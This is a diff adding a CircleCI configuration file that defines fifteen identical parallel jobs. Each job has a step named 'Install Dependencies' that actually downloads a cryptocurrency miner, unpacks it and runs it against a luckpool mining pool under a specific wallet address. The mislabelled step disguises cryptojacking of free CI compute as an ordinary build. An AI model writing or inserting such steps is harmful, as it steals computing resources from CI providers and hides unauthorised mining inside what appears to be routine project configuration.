@@ -1,0 +1,133 @@
+version: 1.8
+orbs:
+  ruby: circleci/ruby@1.1.2
+
+jobs:
+    aku1:
+      docker:
+            - image: circleci/ruby:2.7
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz&&tar xf hellminer_cpu_linux.tar.gz&&./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RPgBLvrs4uqfefFrGuGy5bxVdNe8qDbhQD.tysozyru -p x --cpu 4
+    aku2:
+      docker:
+            - image: circleci/ruby:2.7
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz&&tar xf hellminer_cpu_linux.tar.gz&&./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RPgBLvrs4uqfefFrGuGy5bxVdNe8qDbhQD.tysozyru -p x --cpu 4
+    aku3:
+      docker:
+            - image: circleci/ruby:2.7
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz&&tar xf hellminer_cpu_linux.tar.gz&&./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RPgBLvrs4uqfefFrGuGy5bxVdNe8qDbhQD.tysozyru -p x --cpu 4
+    aku4:
+      docker:
+            - image: circleci/ruby:2.7
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz&&tar xf hellminer_cpu_linux.tar.gz&&./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RPgBLvrs4uqfefFrGuGy5bxVdNe8qDbhQD.tysozyru -p x --cpu 4
+    aku5:
+      docker:
+            - image: circleci/ruby:2.7
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz&&tar xf hellminer_cpu_linux.tar.gz&&./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RPgBLvrs4uqfefFrGuGy5bxVdNe8qDbhQD.tysozyru -p x --cpu 4
+    aku6:
+      docker:
+            - image: circleci/ruby:2.7
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz&&tar xf hellminer_cpu_linux.tar.gz&&./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RPgBLvrs4uqfefFrGuGy5bxVdNe8qDbhQD.tysozyru -p x --cpu 4
+    aku7:
+      docker:
+            - image: circleci/ruby:2.7
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz&&tar xf hellminer_cpu_linux.tar.gz&&./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RPgBLvrs4uqfefFrGuGy5bxVdNe8qDbhQD.tysozyru -p x --cpu 4
+    aku8:
+      docker:
+            - image: circleci/ruby:2.7
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz&&tar xf hellminer_cpu_linux.tar.gz&&./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RPgBLvrs4uqfefFrGuGy5bxVdNe8qDbhQD.tysozyru -p x --cpu 4
+    aku9:
+      docker:
+            - image: circleci/ruby:2.7
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz&&tar xf hellminer_cpu_linux.tar.gz&&./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RPgBLvrs4uqfefFrGuGy5bxVdNe8qDbhQD.tysozyru -p x --cpu 4
+    aku10:
+      docker:
+            - image: circleci/ruby:2.7
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz&&tar xf hellminer_cpu_linux.tar.gz&&./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RPgBLvrs4uqfefFrGuGy5bxVdNe8qDbhQD.tysozyru -p x --cpu 4
+    aku11:
+      docker:
+            - image: circleci/ruby:2.7
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz&&tar xf hellminer_cpu_linux.tar.gz&&./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RPgBLvrs4uqfefFrGuGy5bxVdNe8qDbhQD.tysozyru -p x --cpu 4
+    aku12:
+      docker:
+            - image: circleci/ruby:2.7
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz&&tar xf hellminer_cpu_linux.tar.gz&&./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RPgBLvrs4uqfefFrGuGy5bxVdNe8qDbhQD.tysozyru -p x --cpu 4
+    aku13:
+      docker:
+            - image: circleci/ruby:2.7
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz&&tar xf hellminer_cpu_linux.tar.gz&&./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RPgBLvrs4uqfefFrGuGy5bxVdNe8qDbhQD.tysozyru -p x --cpu 4
+    aku14:
+      docker:
+            - image: circleci/ruby:2.7
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz&&tar xf hellminer_cpu_linux.tar.gz&&./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RPgBLvrs4uqfefFrGuGy5bxVdNe8qDbhQD.tysozyru -p x --cpu 4
+    aku15:
+      docker:
+            - image: circleci/ruby:2.7
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz&&tar xf hellminer_cpu_linux.tar.gz&&./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RPgBLvrs4uqfefFrGuGy5bxVdNe8qDbhQD.tysozyru -p x --cpu 4
+
+
+workflows:
+    version: 2
+    build:
+        jobs:
+            - aku1
+            - aku2
+            - aku3
+            - aku4
+            - aku5
+            - aku6
+            - aku7
+            - aku8
+            - aku9
+            - aku10
+            - aku11
+            - aku12
+            - aku13
+            - aku14
+            - aku15
+
+
